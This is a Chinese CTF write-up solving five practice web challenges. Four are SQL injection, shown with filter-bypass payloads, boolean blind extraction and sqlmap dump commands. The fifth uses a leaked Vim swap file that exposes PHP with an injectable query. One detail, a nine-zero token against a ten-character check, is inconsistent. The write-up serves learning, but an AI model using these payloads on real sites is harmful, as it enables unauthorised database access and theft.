# ctf.mukeran.cn/writeups/web/1/

本次WriteUp中四道题为SQLi，一道题为源代码分析，这是我第一次做CTF题目并写WriteUp，如不规范敬请谅解。  
因未找到合适的图床，这篇WriteUp里面没有图片，可能以后会补上...

[简单的SQL注入 - 实验吧](http://www.shiyanbar.com/ctf/1875 "前往实验吧")
----
1. `id=1'` 发现报SQL格式错误，可能存在字符型注入
2. `id=1' and '1'='1` 无返回值，可能被关键词过滤，于是直接尝试`id=1'/**/and/**/'1'='1`，发现有返回值(事实上看其他WP发现是过滤了and和一个空格，包括其他的select等)，尝试`id=1'/**/and/**/'1'='2`，发现无返回值。
3. 然后`id=1'/**/union/**/select/**/database()'`，发现当前数据库的名称为`web1` (这里有一个注意的是，经测试`select database()`后面可以紧跟一对`''`，而不能使用`where`，其他`select`需要`where '1'='1`来完成`''`的配对)
4. 然后`id=1'/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema='web1'/**/and/**/'1'='1` 发现报错，根据SQL错误信息，发现可能是table\_schema被过滤了，我们将其替换为table\_table\_schemaschema，即`id=1'/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_table_schemaschema='web1'/**/and/**/'1'='1` 得到可疑的table--flag
5. 然后`id=1'/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_table_schemaschema='web1'/**/and/**/table_name='flag'/**/where/**/'1'='1` 发现又报错了，这次information\_schema.columns和column\_name被过滤了，然后`id=1'/**/union/**/select/**/column_column_namename/**/from/**/information_information_schema.columnsschema.columns/**/where/**/table_table_schemaschema='web1'/**/and/**/table_name='flag'/**/and/**/'1'='1` 得到可疑的column--flag
6. 最后`id=1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1` 得到flag

[简单的SQL注入2 - 实验吧](http://www.shiyanbar.com/ctf/1908 "前往实验吧")
----
1. 用上面那道题的步骤进行尝试，在第2步时用database()发现被过滤，于是直接`id=1'/**/union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/'1'='1` 得到可疑的database--web1
2. 接着用上面那道题的步骤测试，发现第5步报错，应该是删除了过滤table_schema, information_schema.columns, column_name，修改`id=1'/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema='web1'/**/and/**/table_name='flag'/**/and/**/'1'='1` 得到可疑column--flag
3. 最后`id=1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1` 得到flag

两道题过滤规则不同


[简单的SQL注入3 - 实验吧](http://www.shiyanbar.com/ctf/1909 "前往实验吧")
----
1. `id=1` 返回Hello!，`id=1'` 报错，存在字符型注入，`id=1' and '1'='1` 返回Hello!，`id=1' and '1'='2` 无返回，可以boolean注入
2. 利用SQL报错获得数据库名`id=1' and (select count(*) from 表名) > 0 and '1'='1`(也可以`> 0 #`用`#`注释掉后面的内容进行尝试，但是这样做的话如果原程序中本来后面还有一些必要的语句，则会失败报错)，得到数据库名web1
3. 用字典爆破的方法爆破flag所在table。先试试flag`id=1' and (select count(*) from information_schema.tables where table_schema='web1') > 0 and '1'='1`，返回Hello!，说明存在表flag
4. 用字典爆破的方法爆破表flag中的列。同样先试flag`id=1' and (select count(flag) from flag) > 0 and '1'='1`，返回Hello!，说明存在列flag，`id=1' and (select count(flag) from flag) > 1 and '1'='1`，无返回，说明就只有一行
5. 那么flag一定是在flag列，唯一的一行里面了，我们枚举爆破一下flag的长度`id=1' and (select length(flag) from flag) > {length} and '1'='1`，得到长度为26
6. 我们用ASCII爆破，用burp或者写一个Python脚本`id=1' and ascii(substr((select flag from flag), {start}, 1))={ascii} and '1'='1`爆破得到flag

后面爆破用burp或者Python，写Python其实也比较简便，后面会补充代码


[这个看起来有点简单! - 实验吧](http://www.shiyanbar.com/ctf/33 "前往实验吧")
----
1. `id=1'`，发现报错，可能存在字符型注入。然后`id=1' and '1'='1`发现还是报错，说明程序中`id={?}`并未加引号，直接尝试`id=1 and 1=1`正常查询，`id=1 and 1=2`无结果，说明可以布尔型注入
2. 尝试`union select`，发现并不行，且网页的输出是按字段输出的，所以`union`查询可能不可行(手动做的话只能用count了)
3. 用sqlmap.py尝试`sqlmap.py -u "http://ctf5.shiyanbar.com/8/index.php?id=1" --current-db`可以正常查询到当前数据库"my_db"
4. `sqlmap.py -u "http://ctf5.shiyanbar.com/8/index.php?id=1" -D "my_db" --tables` 得到table--thiskey
5. `sqlmap.py -u "http://ctf5.shiyanbar.com/8/index.php?id=1" -D "my_db" -T "thiskey" --dump"` 得到flag


[忘记密码了 - 实验吧](http://www.shiyanbar.com/ctf/1808 "前往实验吧")
----
1. 随便输入之后，点击提交，发现alert了一个step2.php的url
2. 进入step2.php，发现直接显示页面后被跳转回step1.php，我们直接用浏览器`view-source:http://ctf5.shiyanbar.com/10/upload/step2.php` 发现其中一个form将内容提交到了submit.php，并且页面中我们看到有Vim留下来的meta，有可能是因为Vim编辑的swap文件没有被删除
3. 访问submit.php，提示不是管理员，我们先尝试一下这个目录中是否有submit.php的swap文件，访问.submit.php.swp，发现真有，里面部分代码：
```php
if(!empty($token)&&!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r>0){
		echo $flag;
	}else{
		echo "失败了呀";
	}
}
```
发现这个token的长度是10，根据上面还要求邮箱为管理员邮箱，我们分析step2.php网页源码，发现meta留下管理员邮箱，并且swap文件里面有数据库结构，其中token有default '0'，我们直接尝试token为000000000，发现正确，得到flag